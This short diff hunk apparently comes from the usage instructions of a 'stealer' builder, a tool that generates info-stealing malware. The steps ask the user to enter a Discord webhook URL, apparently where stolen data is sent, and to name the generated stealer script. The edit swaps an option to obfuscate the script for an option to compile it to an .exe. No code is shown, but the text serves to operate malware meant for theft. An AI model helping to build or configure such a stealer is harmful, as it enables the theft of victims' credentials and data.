@@ -30,6 +30,4 @@ Enter your Discord webhook URL.
 
 Choose a name for the generated stealer script.
 
-Select whether to obfuscate the script (y/n).
-
-The generated script will be saved in the "builder" folder.
+Select whether to compile the script to .exe (y/n).
